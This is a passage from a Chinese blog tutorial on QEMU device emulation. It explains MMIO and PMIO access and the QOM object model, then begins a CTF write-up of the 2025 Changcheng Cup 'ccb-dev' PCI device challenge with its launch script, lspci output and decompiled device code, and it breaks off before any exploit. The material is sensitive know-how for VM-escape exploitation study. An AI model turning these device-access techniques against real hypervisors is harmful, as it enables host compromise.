class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 映射物理地址</span></span><br><span class="line">addr = <span class="built_in">ioremap</span>(ioaddr, iomemsize);</span><br><span class="line"><span class="keyword">if</span> (!addr) &#123;</span><br><span class="line">    <span class="built_in">release_mem_region</span>(ioaddr, iomemsize);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 读写操作</span></span><br><span class="line">val = <span class="built_in">readl</span>(addr);          <span class="comment">// 读取 32 位</span></span><br><span class="line"><span class="built_in">writel</span>(val + <span class="number">1</span>, addr);      <span class="comment">// 写入 32 位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 清理</span></span><br><span class="line"><span class="built_in">iounmap</span>(addr);</span><br><span class="line"><span class="built_in">release_mem_region</span>(ioaddr, iomemsize);</span><br></pre></td></tr></table></figure><p>还有一种方式是在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h3><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure><p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure><p>有一点要注意的是在访问pmio的时候，是直接通过I&#x2F;O port写入和读取资源的，因此要事先声明port归属，不然有可能会导致冲突，pmio常见用于x86平台上，适用于传统的设备，如：串口，键盘等等</p><table><thead><tr><th align="left"><strong>特性</strong></th><th align="left"><strong>MMIO（ioremap + readl&#x2F;writel）</strong></th><th align="left"><strong>PMIO（inb&#x2F;outb）</strong></th></tr></thead><tbody><tr><td align="left"><strong>访问方式</strong></td><td align="left">内存映射（直接访问物理内存）</td><td align="left">I&#x2F;O 端口（x86 <code>in</code>&#x2F;<code>out</code> 指令）</td></tr><tr><td align="left"><strong>适用架构</strong></td><td align="left">所有架构（x86&#x2F;ARM&#x2F;RISC-V）</td><td align="left">主要是 x86</td></tr><tr><td align="left"><strong>地址范围</strong></td><td align="left">32&#x2F;64 位物理地址</td><td align="left">16 位端口地址（0x0000–0xFFFF）</td></tr><tr><td align="left"><strong>性能</strong></td><td align="left">通常更快（内存访问优化）</td><td align="left">较慢（需要 CPU I&#x2F;O 指令）</td></tr><tr><td align="left"><strong>典型设备</strong></td><td align="left">PCIe 设备、GPU、网卡</td><td align="left">传统 ISA 设备（串口、PS&#x2F;2）</td></tr></tbody></table><h2 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h2><p><code>QEMU</code>提供了一套面向对象编程的模型——<code>QOM</code>（<code>QEMU Object Module</code>），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p><p>由于<code>qemu</code>模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解<code>C++</code>或其它面向对象语言来理解<code>QOM</code>。</p><p>有几个比较关键的结构体，<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中<code>ObjectClass</code>、<code>Object</code>、<code>TypeInfo</code>定义在<code>include/qom/object.h</code>中，<code>TypeImpl</code>定义在<code>qom/object.c中</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeInfo</span> &#123;</span><br><span class="line">    <span class="comment">/* 类型标识 */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;          <span class="comment">// 类型名称（唯一标识符，如 &quot;MyDevice&quot;）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;        <span class="comment">// 父类型名称（继承关系，NULL表示无父类）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 实例（对象）相关 */</span></span><br><span class="line">    <span class="type">size_t</span> instance_size;      <span class="comment">// 实例的内存大小（sizeof(MyObject)）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);        <span class="comment">// 实例构造函数（初始化成员变量）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);   <span class="comment">// 实例后置初始化（依赖注入等）</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);    <span class="comment">// 实例析构函数（资源释放）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 类（元类型）相关 */</span></span><br><span class="line">    <span class="type">bool</span> abstract;             <span class="comment">// 是否为抽象类型（不可直接实例化）</span></span><br><span class="line">    <span class="type">size_t</span> class_size;         <span class="comment">// 类结构体大小（sizeof(MyClass)）</span></span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);      <span class="comment">// 类构造函数（初始化静态方法）</span></span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data); <span class="comment">// 父类初始化回调</span></span><br><span class="line">    <span class="built_in">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);   <span class="comment">// 类析构函数（清理静态资源）</span></span><br><span class="line">    <span class="type">void</span> *class_data;          <span class="comment">// 类级别的自定义数据（可选）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 接口支持（多继承） */</span></span><br><span class="line">    InterfaceInfo *interfaces; <span class="comment">// 实现的接口列表（如 [Serializable, Drawable]）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>TypeImpl</code>的属性与<code>TypeInfo</code>的属性对应，实际上<code>qemu</code>就是通过用户提供的<code>TypeInfo</code>创建的<code>TypeImpl</code>的对象。</p><p>如下面定义的<code>pci_test_dev</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">    .name          = TYPE_PCI_TEST_DEV,       <span class="comment">// 类型名称（唯一标识）</span></span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,         <span class="comment">// 父类型（继承自PCI设备）</span></span><br><span class="line">    .instance_size = <span class="built_in">sizeof</span>(PCITestDevState), <span class="comment">// 实例内存大小</span></span><br><span class="line">    .class_init    = pci_testdev_class_init,  <span class="comment">// 类初始化函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">type_register</span>(info);  <span class="comment">// 直接调用动态注册函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(info-&gt;parent);  <span class="comment">// 必须指定父类型（强制单继承）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">type_register_internal</span>(info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = <span class="built_in">type_new</span>(info);      <span class="comment">// 创建类型对象（TypeImpl）</span></span><br><span class="line">    <span class="built_in">type_table_add</span>(ti);       <span class="comment">// 将类型添加到全局类型表</span></span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所有<code>qemu</code>总线、设备等的<code>type_register_static</code>执行完成后，即它们的<code>TypeImpl</code>实例创建成功后，qemu就会在<code>type_initialize</code>函数中去实例化其对应的<code>ObjectClasses</code>。</p><p>每个<code>type</code>都有一个相应的<code>ObjectClass</code>所对应，其中<code>ObjectClass</code>是所有类的基类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span>  <span class="comment">// 表示以下字段为内部实现细节，外部不应直接访问</span></span><br><span class="line">    Type type;                  <span class="comment">// 指向该类的TypeImpl对象，包含类型名称、父类、实例大小等元信息</span></span><br><span class="line">    GSList *interfaces;         <span class="comment">// 该类实现的所有接口（GSList链表结构，支持多接口继承）</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];  <span class="comment">// 缓存对象类型转换结果（如object_dynamic_cast）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];   <span class="comment">// 缓存类类型转换结果（如class_dynamic_cast）</span></span><br><span class="line">    </span><br><span class="line">    ObjectUnparent *unparent;   <span class="comment">// 当对象从父对象中移除时调用的回调函数</span></span><br><span class="line">    GHashTable *properties;     <span class="comment">// 类的静态属性表（存储通过class_property_add()添加的属性定义）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>type</code>是连接<code>ObjectClass</code>和<code>TypeImpl</code>对象的桥梁</p><p>用户可以定义自己的类，继承相应类即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TypeImpl</span> *Type;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ObjectClass</span> ObjectClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type&#x27;s instance */</span></span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">DeviceClass</span> &#123;</span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">PCIDeviceClass</span> &#123;</span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>可以看到类的定义中<strong>父类都在第一个字段</strong>，使得可以父类与子类<strong>直接实现转换</strong>。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会<strong>继承父类相应的虚函数指针</strong>，当所有的父类都<strong>初始化结束后</strong>，<code>TypeInfo::class_init</code>就会<strong>调用</strong>以实现虚函数的初始化，如下例的pci_testdev_class_init所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = <span class="built_in">DEVICE_CLASS</span>(klass);</span><br><span class="line">        PCIDeviceClass *k = <span class="built_in">PCI_DEVICE_CLASS</span>(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;exit = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">&quot;PCI Test Device&quot;</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2025长城杯决赛-ccb-dev"><a href="#2025长城杯决赛-ccb-dev" class="headerlink" title="2025长城杯决赛  ccb-dev"></a>2025长城杯决赛  ccb-dev</h2><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">97b</span>480f126b2:/home/ctf<span class="meta"># cat run.sh \n</span></span><br><span class="line">#!/bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">512</span>M \</span><br><span class="line">    -kernel ./vmlinuz \</span><br><span class="line">    -initrd  ./core.cpio \</span><br><span class="line">    -L pc-bios \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -device ccb-dev-pci \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>看到qemu的启动脚本，有个<code>-device ccb-dev-pci</code>：加载一个 <strong>自定义 PCI 设备</strong></p><p>可以猜测漏洞就在这个pci上，看pci的详细信息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># lspci -v</span></span><br><span class="line"><span class="number">00</span>:<span class="number">01.0</span> Class <span class="number">0601</span>: <span class="number">8086</span>:<span class="number">7000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">04.0</span> Class <span class="number">00f</span>f: <span class="number">1234</span>:<span class="number">1337</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00.0</span> Class <span class="number">0600</span>: <span class="number">8086</span>:<span class="number">1237</span></span><br><span class="line"><span class="number">00</span>:<span class="number">01.3</span> Class <span class="number">0680</span>: <span class="number">8086</span>:<span class="number">7113</span></span><br><span class="line"><span class="number">00</span>:<span class="number">03.0</span> Class <span class="number">0200</span>: <span class="number">8086</span>:<span class="number">100</span>e</span><br><span class="line"><span class="number">00</span>:<span class="number">01.1</span> Class <span class="number">0101</span>: <span class="number">8086</span>:<span class="number">7010</span></span><br><span class="line"><span class="number">00</span>:<span class="number">02.0</span> Class <span class="number">0300</span>: <span class="number">1234</span>:<span class="number">1111</span></span><br></pre></td></tr></table></figure><p>可以看到有两个非标准的厂商和设备id，1234:1337更像是ccb_dev的pci</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/pci0000:<span class="number">00</span>/<span class="number">0000</span>:<span class="number">00</span>:<span class="number">04.0</span> <span class="meta"># hexdump config</span></span><br><span class="line"><span class="number">0000000</span> <span class="number">1234</span> <span class="number">1337</span> <span class="number">0103</span> <span class="number">0000</span> <span class="number">0081</span> <span class="number">00f</span>f <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line"><span class="number">0000010</span> <span class="number">1000</span> febf <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line"><span class="number">0000020</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1</span>af4 <span class="number">1100</span></span><br><span class="line"><span class="number">0000030</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line">*</span><br><span class="line"><span class="number">0000100</span></span><br></pre></td></tr></table></figure><p>这里有个BAR0是MMIO</p><p>逆向<code>qemu</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DeviceClass *dc; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  PCIDeviceClass *pci; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dc = (DeviceClass *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                        oc,</span><br><span class="line">                        <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                        <span class="number">146</span>,</span><br><span class="line">                        <span class="string">&quot;ccb_dev_class_init&quot;</span>);</span><br><span class="line">  pci = (PCIDeviceClass *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                            oc,</span><br><span class="line">                            <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                            <span class="number">147</span>,</span><br><span class="line">                            <span class="string">&quot;ccb_dev_class_init&quot;</span>);</span><br><span class="line">  pci-&gt;realize = (<span class="built_in">void</span> (*)(PCIDevice *, Error **))ccb_dev_realize;</span><br><span class="line">  pci-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  pci-&gt;device_id = <span class="number">4919</span>;</span><br><span class="line">  pci-&gt;revision = <span class="number">-127</span>;</span><br><span class="line">  pci-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  dc-&gt;desc = <span class="string">&quot;arttnba3 test PCI device&quot;</span>;</span><br><span class="line">  <span class="built_in">set_bit_68</span>(<span class="number">7LL</span>, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致的作用：</p><ul><li>确保当前设备类继承自 QEMU 的通用设备基类 和 确保当前设备类是一个 PCI 设备。</li><li><code>realize</code> 是 QEMU 设备初始化的关键回调，在设备实例化时被调用</li><li>配置 PCI 设备的厂商 ID、设备 ID、版本号和类代码。</li><li>然后 设置设备的描述字符串。</li><li>最后设置 类别掩码 对 设备进行分类，掩码为7</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_realize</span><span class="params">(PCIDevice *pci_dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             &amp;pci_dev-&gt;qdev.parent_obj,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">123</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_realize&quot;</span>);</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(</span><br><span class="line">    &amp;ds_0-&gt;mmio,</span><br><span class="line">    &amp;ds_0-&gt;parent_obj.qdev.parent_obj,</span><br><span class="line">    &amp;ccb_dev_mmio_ops,</span><br><span class="line">    pci_dev,</span><br><span class="line">    <span class="string">&quot;ccb_dev-mmio&quot;</span>,</span><br><span class="line">    <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">pci_register_bar</span>(pci_dev, <span class="number">0</span>, <span class="number">0</span>, &amp;ds_0-&gt;mmio);</span><br><span class="line">  <span class="built_in">memset</span>(ds_0-&gt;buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(ds_0-&gt;buffer));</span><br><span class="line">  ds_0-&gt;index = <span class="number">0</span>;</span><br><span class="line">  